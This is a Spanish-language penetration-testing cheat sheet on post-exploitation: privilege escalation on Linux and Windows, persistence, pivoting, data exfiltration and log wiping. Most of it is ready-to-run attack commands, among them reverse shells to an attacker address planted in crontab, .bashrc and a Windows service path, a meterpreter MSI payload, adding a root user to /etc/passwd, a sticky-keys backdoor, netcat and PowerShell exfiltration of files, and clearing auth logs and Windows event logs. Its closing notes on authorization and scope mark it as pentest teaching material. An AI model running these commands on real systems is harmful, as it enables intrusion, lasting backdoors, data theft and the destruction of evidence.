# Post-Explotación

## ¿Qué es la post-explotación?

La post-explotación es la fase después de obtener acceso inicial al sistema. El objetivo es:
- Mantener el acceso
- Escalar privilegios
- Pivotar a otros sistemas
- Exfiltrar información
- Cubrir rastros

## Escalada de Privilegios

### Linux Privilege Escalation

#### Enumeración del sistema
```bash
# Información básica
whoami
id
hostname
uname -a
cat /etc/issue
cat /etc/*-release

# Usuarios y grupos
cat /etc/passwd
cat /etc/group
cat /etc/shadow  # Si tienes acceso

# Historia de comandos
cat ~/.bash_history
cat ~/.zsh_history

# Variables de entorno
env
cat /etc/environment

# Procesos en ejecución
ps aux
ps -ef

# Servicios
systemctl list-units --type=service
service --status-all
```

#### SUID/SGID Binaries
```bash
# Buscar archivos SUID
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Buscar archivos SGID
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Explotar binarios SUID comunes
# Ver GTFOBins: https://gtfobins.github.io/
```

#### Capabilities
```bash
# Listar capabilities
getcap -r / 2>/dev/null

# Ejemplo de explotación
# Si python tiene cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Sudo
```bash
# Ver privilegios sudo
sudo -l

# GTFOBins para bypass sudo
# https://gtfobins.github.io/#+sudo
```

#### Cron Jobs
```bash
# Ver cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Cron jobs de todos los usuarios
for user in $(cat /etc/passwd | cut -f1 -d:); do echo $user; crontab -u $user -l; done
```

#### Writable /etc/passwd
```bash
# Verificar permisos
ls -l /etc/passwd

# Generar password
openssl passwd -1 -salt xyz password123

# Agregar usuario root
echo 'newroot:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

#### NFS Shares
```bash
# Ver exports
cat /etc/exports

# Si hay no_root_squash, montar desde atacante
showmount -e 192.168.1.100
mkdir /tmp/mount
mount -o rw 192.168.1.100:/share /tmp/mount

# Crear SUID binary
cp /bin/bash /tmp/mount/bash
chmod +s /tmp/mount/bash

# En la víctima
/share/bash -p
```

#### Kernel Exploits
```bash
# Versión del kernel
uname -a
cat /proc/version

# Buscar exploits
searchsploit "linux kernel 4.4"

# Herramientas de enumeración
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
bash linux-exploit-suggester.sh

# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Windows Privilege Escalation

#### Enumeración del sistema
```powershell
# Información básica
whoami
whoami /priv
whoami /groups
hostname
systeminfo

# Usuarios
net user
net user <usuario>
net localgroup administrators

# Sesiones activas
query user
qwinsta
```

#### Windows Exploits
```powershell
# Buscar parches instalados
wmic qfe list full

# Buscar exploits para Windows
searchsploit windows | grep -i "privilege escalation"

# WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
.\winPEASx64.exe
```

#### Servicios mal configurados
```powershell
# Listar servicios
sc query state= all
wmic service list brief

# Permisos de servicios
accesschk.exe /accepteula -uwcqv "usuario" *
accesschk.exe -uwcqv "Authenticated Users" *

# Modificar servicio
sc config <servicio> binpath= "C:\nc.exe -nv 10.0.0.1 4444 -e cmd.exe"
sc stop <servicio>
sc start <servicio>
```

#### Unquoted Service Paths
```powershell
# Buscar rutas sin comillas
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """

# Si hay espacio en la ruta sin comillas:
# C:\Program Files\Vulnerable Service\service.exe
# Windows buscará en:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe

# Colocar payload en ruta explotable
copy payload.exe "C:\Program.exe"
```

#### AlwaysInstallElevated
```powershell
# Verificar configuración
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si ambos están en 1, crear MSI malicioso
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o payload.msi

# Instalar
msiexec /quiet /qn /i payload.msi
```

#### Scheduled Tasks
```powershell
# Listar tareas programadas
schtasks /query /fo LIST /v

# Ver permisos
icacls C:\ruta\script.bat

# Si tenemos permisos de escritura, modificar script
```

#### Token Impersonation
```powershell
# Verificar privilegios
whoami /priv

# Si SeImpersonatePrivilege está habilitado:
# Usar JuicyPotato, PrintSpoofer, o RoguePotato

# PrintSpoofer (Windows 10/Server 2019)
.\PrintSpoofer.exe -i -c cmd

# JuicyPotato (Windows anteriores)
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

## Persistencia

### Linux

#### SSH Keys
```bash
# Agregar tu llave pública
mkdir ~/.ssh
echo "tu_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### Cron Job
```bash
# Agregar reverse shell en crontab
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -
```

#### Backdoor en .bashrc
```bash
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> ~/.bashrc
```

### Windows

#### Registry Run Keys
```powershell
# Agregar programa al inicio
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
```

#### Scheduled Task
```powershell
# Crear tarea programada
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru System
```

#### Sticky Keys Backdoor
```powershell
# Reemplazar sethc.exe (Sticky Keys)
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
move C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Ahora presionar Shift 5 veces en login screen abrirá cmd
```

## Pivoting

### Port Forwarding

#### SSH Local Port Forward
```bash
# Redirigir puerto local al remoto
ssh -L 8080:192.168.2.10:80 user@192.168.1.100

# Acceder desde tu máquina
curl http://localhost:8080
```

#### SSH Remote Port Forward
```bash
# Exponer tu puerto local en el servidor remoto
ssh -R 8080:localhost:80 user@192.168.1.100
```

#### SSH Dynamic Port Forward (SOCKS Proxy)
```bash
# Crear SOCKS proxy
ssh -D 9050 user@192.168.1.100

# Usar con proxychains
proxychains nmap 192.168.2.0/24
```

### Chisel
```bash
# En atacante (servidor)
./chisel server -p 8000 --reverse

# En víctima (cliente)
./chisel client 10.0.0.1:8000 R:1080:socks

# Configurar proxychains
# Editar /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

### Metasploit Pivoting
```bash
# En sesión Meterpreter
run autoroute -s 192.168.2.0/24

# Port forward
portfwd add -l 3389 -p 3389 -r 192.168.2.10

# SOCKS proxy
use auxiliary/server/socks_proxy
set VERSION 4a
run

# Usar proxychains
proxychains nmap -sT 192.168.2.10
```

## Exfiltración de Datos

### Linux
```bash
# Base64 encode y copiar
base64 file.txt

# HTTP
python3 -m http.server 8000
# Desde atacante:
wget http://192.168.1.100:8000/file.txt

# SCP
scp file.txt user@10.0.0.1:/tmp/

# Netcat
# En atacante:
nc -nvlp 4444 > file.txt
# En víctima:
nc 10.0.0.1 4444 < file.txt
```

### Windows
```powershell
# PowerShell download
Invoke-WebRequest -Uri "http://10.0.0.1:8000/file.txt" -OutFile "C:\file.txt"

# Upload via PowerShell
$client = New-Object System.Net.WebClient
$client.UploadFile("http://10.0.0.1:8000/upload", "C:\sensitive.txt")

# SMB
copy file.txt \\10.0.0.1\share\
```

## Limpieza de Rastros

### Linux
```bash
# Limpiar history
history -c
echo "" > ~/.bash_history

# Limpiar logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Modificar timestamps
touch -r original.txt fake.txt
```

### Windows
```powershell
# Limpiar Event Logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Limpiar logs específicos
Clear-EventLog -LogName Application
```

## Herramientas de Post-Explotación

| Herramienta | Plataforma | Propósito |
|-------------|-----------|-----------|
| LinPEAS | Linux | Enumeración automática |
| WinPEAS | Windows | Enumeración automática |
| LinEnum | Linux | Enumeración |
| PowerUp | Windows | Privilege escalation |
| Mimikatz | Windows | Credential dumping |
| BloodHound | Windows/AD | Análisis de AD |
| Chisel | Multi | Tunneling |
| ligolo-ng | Multi | Pivoting |

## Checklist de Post-Explotación

- [ ] Enumerar sistema operativo y versión
- [ ] Buscar credenciales en archivos de configuración
- [ ] Identificar otros usuarios en el sistema
- [ ] Buscar archivos sensibles
- [ ] Identificar rutas de escalada de privilegios
- [ ] Establecer persistencia
- [ ] Identificar redes adicionales
- [ ] Documentar todos los hallazgos
- [ ] Exfiltrar datos (con autorización)
- [ ] Limpiar rastros (según alcance del engagement)

## Notas Importantes

> [!WARNING]
> La fase de post-explotación debe realizarse con extremo cuidado:
> - No causes daños al sistema
> - No elimines logs sin autorización
> - Documenta TODAS tus acciones
> - Respeta el alcance del engagement

> [!TIP]
> **Siempre:**
> - Mantén notas detalladas de tus acciones
> - Toma capturas de pantalla de evidencias
> - Guarda copias de archivos importantes
> - Ten múltiples métodos de acceso por si uno falla

## Referencias

- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
